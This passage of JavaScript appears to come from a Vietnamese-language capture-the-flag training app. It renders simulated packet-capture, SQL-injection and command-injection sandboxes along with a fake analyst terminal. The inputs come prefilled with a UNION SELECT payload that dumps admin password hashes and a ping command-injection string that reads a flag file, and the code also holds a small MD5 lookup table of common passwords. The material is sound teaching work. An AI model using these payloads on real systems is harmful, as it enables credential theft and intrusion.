        // Panel 2: Interactive Sandbox
        this.renderSandbox(c);

        // Raw code snippet block
        if (this.ui.codeSnippet) this.ui.codeSnippet.textContent = c.codeSnippet;

        // Panel 4: Defense
        if (this.ui.cardDefenseContent) {
            this.ui.cardDefenseContent.innerHTML = `<pre class="cyber-code-block text-emerald-300 p-3 text-xs leading-relaxed whitespace-pre-wrap">${c.defense || "Đang cập nhật hướng dẫn phòng thủ."}</pre>`;
        }

        // Hint
        if (this.ui.hintText) this.ui.hintText.innerHTML = c.hint;
        if (this.ui.hintBox) this.ui.hintBox.classList.add('hidden');

        // Status & Flag input
        if (this.ui.statusBox) this.ui.statusBox.classList.add('hidden');
        if (this.ui.flagInput) this.ui.flagInput.value = '';

        if (isSolved) {
            this.ui.flagInput.placeholder = "Bạn đã hoàn thành thử thách này!";
            this.ui.flagInput.disabled = true;
            this.ui.submitBtn.disabled = true;
            this.ui.submitBtn.innerHTML = "✅ ĐÃ CHIẾM CỜ";
            this.ui.submitBtn.className = "btn-secondary opacity-60";
        } else {
            this.ui.flagInput.placeholder = "Nhập cờ định dạng FLAG{...}";
            this.ui.flagInput.disabled = false;
            this.ui.submitBtn.disabled = false;
            this.ui.submitBtn.innerHTML = "🚩 Nộp Cờ (Submit Flag)";
            this.ui.submitBtn.className = "btn-primary";
        }

        // Reset to first tab (Theory) or maintain active
        this.switchWorkbenchTab(this.activeWorkbenchTab);

        // Terminal initial greeting for this challenge
        this.printTerminal(`\n[+] Chuyển sang Bài ${c.id}: ${c.title}. Gõ "ls" để xem file chứng cứ, "cat <file>" để đọc.`, 'text-cyan-400 font-bold');
    }

    renderSandbox(c) {
        if (!this.ui.sandboxContainer) return;
        this.ui.sandboxContainer.innerHTML = '';

        if (c.sandboxType === 'wireshark' && c.sandboxData && c.sandboxData.packets) {
            if (this.ui.sandboxBadge) this.ui.sandboxBadge.textContent = "WIRESHARK PACKET DISSECTOR";
            const wrapper = document.createElement('div');
            wrapper.className = "rounded-xl overflow-hidden border border-slate-800 bg-slate-950";

            let rows = c.sandboxData.packets.map((pkt, idx) => `
                <tr class="ctf-pcap-row ${idx === 0 ? 'selected' : ''}" data-idx="${idx}">
                    <td class="text-slate-400">${pkt.no}</td>
                    <td class="text-slate-400">${pkt.time}</td>
                    <td class="font-bold text-cyan-300">${pkt.src}</td>
                    <td class="font-bold text-purple-300">${pkt.dst}</td>
                    <td class="font-bold text-amber-300">${pkt.proto}</td>
                    <td class="text-slate-200">${pkt.info}</td>
                </tr>
            `).join('');

            wrapper.innerHTML = `
                <div class="px-3 py-1.5 bg-slate-900 border-b border-slate-800 text-xs font-bold text-cyan-400 flex items-center justify-between">
                    <span>📡 Wireshark Capture Table (Nhấp chuột vào gói tin để kiểm tra Frame)</span>
                    <span class="text-slate-500 font-normal">Tổng: ${c.sandboxData.packets.length} gói tin</span>
                </div>
                <div class="overflow-x-auto max-h-48">
                    <table class="ctf-pcap-table">
                        <thead>
                            <tr>
                                <th>No.</th>
                                <th>Time</th>
                                <th>Source</th>
                                <th>Destination</th>
                                <th>Protocol</th>
                                <th>Info</th>
                            </tr>
                        </thead>
                        <tbody>${rows}</tbody>
                    </table>
                </div>
                <div id="ctf-pcap-details" class="p-2.5 bg-slate-900/90 border-t border-slate-800 text-xs font-mono text-cyan-300">
                    <span class="text-slate-400">Chi tiết Frame đã chọn:</span> ${c.sandboxData.packets[0].info}
                </div>
            `;

            // Click on packet row to inspect
            wrapper.querySelectorAll('.ctf-pcap-row').forEach(row => {
                row.addEventListener('click', () => {
                    wrapper.querySelectorAll('.ctf-pcap-row').forEach(r => r.classList.remove('selected'));
                    row.classList.add('selected');
                    const idx = parseInt(row.getAttribute('data-idx'));
                    const p = c.sandboxData.packets[idx];
                    const details = wrapper.querySelector('#ctf-pcap-details');
                    if (details) {
                        details.innerHTML = `<span class="text-slate-400">Frame ${p.no} (${p.proto}):</span> <span class="text-cyan-300 font-bold">${p.info}</span> | <span class="text-slate-400">Src:</span> ${p.src} -> <span class="text-slate-400">Dst:</span> ${p.dst}`;
                    }
                    if (window.soundManager) window.soundManager.playClick();
                });
            });

            this.ui.sandboxContainer.appendChild(wrapper);

        } else if (c.sandboxType === 'web' && c.sandboxData) {
            if (this.ui.sandboxBadge) this.ui.sandboxBadge.textContent = "BURP SUITE WEB REPEATER";
            const wrapper = document.createElement('div');
            wrapper.className = "p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2 text-xs font-mono";

            if (c.sandboxData.type === 'sql-repeater') {
                wrapper.innerHTML = `
                    <div class="text-cyan-400 font-bold flex items-center justify-between">
                        <span>🌐 HTTP POST /profile.php - SQL Injection Sandbox</span>
                        <span class="text-slate-500">Live Endpoint</span>
                    </div>
                    <div class="flex gap-2">
                        <input type="text" id="ctf-sql-input" value="-1' UNION SELECT 1, group_concat(username, 0x3a, pass_hash), 3 FROM admin_users-- -" class="flex-grow bg-slate-900 border border-slate-700 rounded px-3 py-1.5 text-xs text-amber-300 focus:outline-none font-mono">
                        <button id="ctf-sql-send-btn" class="px-3 py-1.5 rounded bg-cyan-600 hover:bg-cyan-500 text-white font-bold transition">🚀 Send Request</button>
                    </div>
                    <div class="p-2 rounded bg-slate-900 border border-slate-800 text-[11px] text-slate-300" id="ctf-sql-output">
                        <b>Server Response (HTTP 200 OK):</b><br>
                        <code>Extracted: root_admin:482c811da5d5b4bc6d497ffa98491e38</code>
                    </div>
                `;
                const sendBtn = wrapper.querySelector('#ctf-sql-send-btn');
                const sqlInput = wrapper.querySelector('#ctf-sql-input');
                const sqlOutput = wrapper.querySelector('#ctf-sql-output');
                if (sendBtn) {
                    sendBtn.addEventListener('click', () => {
                        const val = sqlInput.value;
                        if (val.toLowerCase().includes('union') && val.toLowerCase().includes('admin_users')) {
                            sqlOutput.innerHTML = `<b>HTTP/1.1 200 OK</b><br><span class="text-emerald-400">[SQL EXECUTED]: root_admin:482c811da5d5b4bc6d497ffa98491e38</span>`;
                        } else {
                            sqlOutput.innerHTML = `<b>HTTP/1.1 200 OK</b><br><span class="text-slate-400">Record found for query: ${val} (Standard user profile rendered)</span>`;
                        }
                        if (window.soundManager) window.soundManager.playClick();
                    });
                }
            } else if (c.sandboxData.type === 'command-repeater') {
                wrapper.innerHTML = `
                    <div class="text-cyan-400 font-bold flex items-center justify-between">
                        <span>🌐 Diagnostic Ping Utility - Command Injection Sandbox</span>
                        <span class="text-slate-500">POST /tools/ping.php</span>
                    </div>
                    <div class="flex gap-2">
                        <input type="text" id="ctf-cmd-input" value="127.0.0.1; cat /etc/flag.txt | base64" class="flex-grow bg-slate-900 border border-slate-700 rounded px-3 py-1.5 text-xs text-amber-300 focus:outline-none font-mono">
                        <button id="ctf-cmd-send-btn" class="px-3 py-1.5 rounded bg-cyan-600 hover:bg-cyan-500 text-white font-bold transition">🚀 Send Request</button>
                    </div>
                    <div class="p-2 rounded bg-slate-900 border border-slate-800 text-[11px] text-slate-300" id="ctf-cmd-output">
                        <b>HTTP/1.1 200 OK - Response Body:</b><br>
                        <code>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.<br>[COMMAND OUTPUT]: UkNFX3NlbWljb2xvbl9jb21tYW5kX2luamVjdGlvbl9wYXNzd29yZF9leGZpbA==</code>
                    </div>
                `;
                const sendBtn = wrapper.querySelector('#ctf-cmd-send-btn');
                const cmdInput = wrapper.querySelector('#ctf-cmd-input');
                const cmdOutput = wrapper.querySelector('#ctf-cmd-output');
                if (sendBtn) {
                    sendBtn.addEventListener('click', () => {
                        const val = cmdInput.value;
                        if (val.includes(';') || val.includes('|')) {
                            cmdOutput.innerHTML = `<b>HTTP/1.1 200 OK</b><br>PING 127.0.0.1 56 bytes...<br><span class="text-emerald-400 font-bold">[OUTPUT]: UkNFX3NlbWljb2xvbl9jb21tYW5kX2luamVjdGlvbl9wYXNzd29yZF9leGZpbA==</span>`;
                        } else {
                            cmdOutput.innerHTML = `<b>HTTP/1.1 200 OK</b><br>PING ${val} 56 bytes... 0% packet loss.`;
                        }
                        if (window.soundManager) window.soundManager.playClick();
                    });
                }
            } else {
                wrapper.innerHTML = `<div class="text-cyan-400 font-bold">Interactive Web Sandbox Active</div><div class="text-slate-400">Endpoint: ${c.sandboxData.endpoint || "Live"}</div>`;
            }

            this.ui.sandboxContainer.appendChild(wrapper);

        } else {
            if (this.ui.sandboxBadge) this.ui.sandboxBadge.textContent = "RAW ARTIFACT INSPECTOR";
            const wrapper = document.createElement('div');
            wrapper.className = "p-2.5 rounded-xl bg-slate-950 border border-slate-800 text-xs font-mono text-slate-300 flex items-center justify-between";
            wrapper.innerHTML = `
                <span>📁 Chứng cứ số: <b class="text-cyan-300">${Object.keys(c.virtualFiles || {}).join(', ') || 'evidence.log'}</b></span>
                <span class="text-slate-500">Mở tab Terminal để tương tác bằng lệnh cat / grep / strings</span>
            `;
            this.ui.sandboxContainer.appendChild(wrapper);
        }
    }

    handleSubmitFlag() {
        const c = this.challenges[this.activeChallengeIndex];
        if (!c || this.solvedFlags.has(c.id)) return;

        const inputVal = this.ui.flagInput.value.trim();
        this.ui.statusBox.classList.remove('hidden');

        // Check flag case-insensitively
        const isCorrect = inputVal.toLowerCase() === c.flag.toLowerCase();

        if (isCorrect) {
            // Correct Flag
            if (window.soundManager) window.soundManager.playFlagCaptured();
            this.solvedFlags.add(c.id);
            localStorage.setItem('mmt_ctf_solved', JSON.stringify(Array.from(this.solvedFlags)));

            this.ui.statusBox.className = "p-3 rounded-xl bg-emerald-950/80 border border-emerald-500 text-emerald-300 font-bold text-center text-xs sm:text-sm";
            this.ui.statusBox.innerHTML = `🎉 CHÍNH XÁC! CỜ ĐÃ ĐƯỢC GIẢI MÃ THÀNH CÔNG! (+${c.points} Điểm)`;

            this.updateStats();
            this.renderRoadmap();
            this.renderChallengeList();
            this.renderActiveChallenge();

            // Append to terminal
            this.printTerminal(`[SUCCESS] Flag accepted for Challenge ${c.id}: ${c.title}! +${c.points} Points awarded!`, 'text-emerald-400 font-bold');
        } else {
            // Wrong Flag
            if (window.soundManager) window.soundManager.playWrong();
            this.ui.statusBox.className = "p-3 rounded-xl bg-rose-950/80 border border-rose-500 text-rose-300 font-bold text-center text-xs sm:text-sm";
            this.ui.statusBox.innerHTML = `❌ CỜ KHÔNG CHÍNH XÁC! Hãy kiểm tra lại phân tích dữ liệu hoặc mở "💡 Xem gợi ý giải mã cờ".`;

            this.printTerminal(`[FAIL] Invalid flag: "${inputVal}"`, 'text-rose-400');
        }
    }

    handleTerminalCommand(cmd) {
        if (!cmd) return;
        this.printTerminal(`analyst@netlab:~$ ${cmd}`, 'text-cyan-300 font-bold');

        const parts = cmd.split(' ');
        const main = parts[0].toLowerCase();
        const curChallenge = this.challenges[this.activeChallengeIndex];
        const vFiles = curChallenge ? (curChallenge.virtualFiles || {}) : {};

        switch (main) {
            case 'help':
                this.printTerminal(
`[NETLAB CYBER TERMINAL CLI v3.0 - VIRTUAL OS]
Các lệnh tương tác với phòng lab:
- ls / dir: Liệt kê các tệp chứng cứ của phòng lab hiện tại
- cat <tệp>: Đọc toàn bộ nội dung tệp tin
- grep <từ_khóa> <tệp>: Tìm kiếm dòng chứa từ khóa trong tệp
- strings <tệp>: Trích xuất các chuỗi ký tự in được từ tệp
- b64 decode <chuỗi>: Giải mã Base64 (hỗ trợ cả UTF-16LE)
- b64 encode <chuỗi>: Mã hóa chuỗi sang Base64
- crack md5 <hash>: Tra cứu và bẻ khóa hash MD5 trong rainbow table tích hợp
- nmap <target>: Giả lập quét cổng mạng mục tiêu
- tools: Cẩm nang 10 công cụ an ninh mạng thực chiến
- list: Xem danh sách các bài lab trong phân vùng
- hint: Xem gợi ý tư duy phương pháp giải
- flag <FLAG{...}>: Nộp cờ trực tiếp qua terminal
- clear: Xóa màn hình terminal`, 'text-slate-200');
                break;

            case 'ls':
            case 'dir':
                const fileNames = Object.keys(vFiles);
                if (fileNames.length === 0) {
                    this.printTerminal(`(Thư mục trống)`, 'text-slate-500');
                } else {
                    this.printTerminal(`Tệp tin chứng cứ trong Lab ${curChallenge.id}:\n${fileNames.map(f => `-r--r--r-- 1 root root ${vFiles[f].length}B ${f}`).join('\n')}`, 'text-emerald-300');
                }
                break;

            case 'cat':
                const targetFile = parts[1];
                if (!targetFile) {
                    this.printTerminal(`Cú pháp: cat <tên_file>. Gõ "ls" để xem danh sách file.`, 'text-rose-400');
                } else if (vFiles[targetFile]) {
                    this.printTerminal(`=== ${targetFile} ===\n${vFiles[targetFile]}`, 'text-slate-200');
                } else {
                    this.printTerminal(`cat: ${targetFile}: Không tìm thấy tệp. Gõ "ls" để xem file hiện có.`, 'text-rose-400');
                }
                break;

            case 'grep':
                const keyword = parts[1];
                const gFile = parts[2];
                if (!keyword || !gFile) {
                    this.printTerminal(`Cú pháp: grep <từ_khóa> <tên_file>`, 'text-rose-400');
                } else if (vFiles[gFile]) {
                    const lines = vFiles[gFile].split('\n').filter(l => l.toLowerCase().includes(keyword.toLowerCase()));
                    if (lines.length > 0) {
                        this.printTerminal(lines.join('\n'), 'text-amber-300');
                    } else {
                        this.printTerminal(`Không tìm thấy dòng nào chứa "${keyword}".`, 'text-slate-500');
                    }
                } else {
                    this.printTerminal(`grep: ${gFile}: Không tìm thấy tệp.`, 'text-rose-400');
                }
                break;

            case 'strings':
                const sFile = parts[1];
                if (!sFile) {
                    this.printTerminal(`Cú pháp: strings <tên_file>`, 'text-rose-400');
                } else if (vFiles[sFile]) {
                    this.printTerminal(vFiles[sFile], 'text-slate-200');
                } else {
                    this.printTerminal(`strings: ${sFile}: Không tìm thấy tệp.`, 'text-rose-400');
                }
                break;

            case 'crack':
                const crackType = parts[1] ? parts[1].toLowerCase() : '';
                const hashVal = parts[2] ? parts[2].trim().toLowerCase() : '';
                if (crackType !== 'md5' || !hashVal) {
                    this.printTerminal(`Cú pháp: crack md5 <32_ký_tự_hash>`, 'text-rose-400');
                    break;
                }
                const rainbowTable = {
                    '482c811da5d5b4bc6d497ffa98491e38': 'password123',
                    'e10adc3949ba59abbe56e057f20f883e': '123456',
                    '0192023a7bbd73250516f069df18b500': 'admin123',
                    '25d55ad283aa400af464c76d713c07ad': '12345678',
                    '5f4dcc3b5aa765d61d8327deb882cf99': 'password'
                };
                if (rainbowTable[hashVal]) {
                    this.printTerminal(`[+] Hash: ${hashVal}\n[+] Type: MD5\n[+] Status: CRACKED!\n[+] Plaintext: "${rainbowTable[hashVal]}"`, 'text-emerald-400 font-bold');
                } else {
                    this.printTerminal(`[-] Hash ${hashVal} không có trong từ điển mẫu cơ bản. Thử tra cứu trên CrackStation.net!`, 'text-amber-300');
                }
                break;

            case 'b64':
                const action = parts[1] ? parts[1].toLowerCase() : '';
                const payload = parts.slice(2).join(' ');
                if (!action || !payload) {
                    this.printTerminal(`Cú pháp: b64 decode <chuỗi> HOẶC b64 encode <chuỗi>`, 'text-rose-400');
                    break;
                }
                try {
                    if (action === 'decode') {
                        const binaryStr = atob(payload.trim());
                        let decoded = "";
                        if (binaryStr.includes('\x00')) {
                            const bytes = new Uint8Array(binaryStr.length);
                            for (let i = 0; i < binaryStr.length; i++) bytes[i] = binaryStr.charCodeAt(i);
                            decoded = new TextDecoder('utf-16le').decode(bytes);
                        } else {
                            decoded = decodeURIComponent(escape(binaryStr));
                        }
                        this.printTerminal(`[B64 DECODED]: ${decoded}`, 'text-emerald-300 font-bold');
                    } else if (action === 'encode') {
                        const encoded = btoa(unescape(encodeURIComponent(payload)));
                        this.printTerminal(`[B64 ENCODED]: ${encoded}`, 'text-emerald-300 font-bold');
                    }
                } catch (err) {
                    this.printTerminal(`[LỖI]: Không thể xử lý Base64: ${err.message}`, 'text-rose-400');
                }
                break;

            case 'nmap':
                this.printTerminal(`Starting Nmap 7.94 scan on target...\nPORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 2.3.4 (CVE-2011-2523)\n80/tcp  open  http    Apache httpd 2.4.41\n443/tcp open  ssl     Apache httpd 2.4.41`, 'text-slate-300');
                break;

            case 'tools':
                this.printTerminal(
`🛡️ BẢNG TRA CỨU CÔNG CỤ AN NINH MẠNG THỰC CHIẾN (CYBERSECURITY TOOLKIT):
----------------------------------------------------------------------
1. Wireshark / Tshark: Điều tra bắt gói tin mạng, phân tích giao thức (ARP, TCP, DNS, HTTP, SMB).
2. Nmap / NSE: Quét cổng, nhận diện phiên bản dịch vụ và quét lỗ hổng biên.
3. Burp Suite: Proxy kiểm thử thâm nhập ứng dụng Web (SQLi, XSS, CSRF, RCE, IDOR, JWT).
4. CyberChef: Con dao Thụy Sĩ giải mã Base64, Hex, URL, XOR, UTF-16LE, Hashing.
5. Hashcat / John the Ripper: Bẻ khóa mật khẩu và hash (MD5, SHA, NTLM, bcrypt).
6. Scapy: Thư viện Python chế tạo và phân mảnh gói tin IP/TCP bypass Firewall.
7. Volatility: Điều tra chứng cứ số trên bộ nhớ RAM (Memory Forensics), tìm malware ngầm.
8. LinPEAS / WinPEAS: Script tự động rà soát leo thang đặc quyền Linux/Windows.
9. Ghidra / IDA Pro / GDB: Dịch ngược nhị phân và khai thác tràn bộ đệm (Buffer Overflow).
10. Aircrack-ng suite: Bẻ khóa Wi-Fi WPA2, phát hiện Rogue AP / Evil Twin.`, 'text-cyan-300 font-mono');
                break;

            case 'list':
                const filtered = this.getFilteredChallenges();
                this.printTerminal(`=== DANH SÁCH THỬ THÁCH (${filtered.length} BÀI) ===`, 'text-cyan-400 font-bold');
                filtered.forEach(c => {
                    const status = this.solvedFlags.has(c.id) ? '[✅ ĐÃ GIẢI]' : '[🚩 CHƯA GIẢI]';
                    const color = this.solvedFlags.has(c.id) ? 'text-emerald-400' : 'text-slate-300';
                    this.printTerminal(`${status} Bài ${c.id}: ${c.title} (+${c.points} pts)`, color);
                });
                break;

            case 'hint':
                const cur = this.challenges[this.activeChallengeIndex];
                const tempDiv = document.createElement('div');
                tempDiv.innerHTML = cur.hint;
                const cleanHint = tempDiv.innerText || tempDiv.textContent || "";
                this.printTerminal(`=== GỢI Ý BÀI ${cur.id} ===\n${cleanHint}`, 'text-amber-300');
                break;

            case 'flag':
            case 'submit':
                const flagVal = parts.slice(1).join(' ').trim();
                if (flagVal) {
                    this.ui.flagInput.value = flagVal;
                    this.handleSubmitFlag();
                } else {
                    this.printTerminal(`Cú pháp: flag FLAG{...}`, 'text-rose-400');
                }
                break;

            case 'clear':
                if (this.ui.terminalOutput) this.ui.terminalOutput.innerHTML = '';
                break;

            default:
                this.printTerminal(`Lệnh không nhận dạng: "${cmd}". Gõ "help" hoặc "tools" để xem trợ giúp.`, 'text-slate-500');
                break;
        }
    }

    printTerminal(text, colorClass = 'text-slate-300') {
        if (!this.ui.terminalOutput) return;
        const line = document.createElement('div');
        line.className = `${colorClass} whitespace-pre-wrap leading-relaxed py-0.5`;
        line.textContent = text;
        this.ui.terminalOutput.appendChild(line);
        this.ui.terminalOutput.scrollTop = this.ui.terminalOutput.scrollHeight;
    }
}

window.ctfEngine = new CTFEngine();
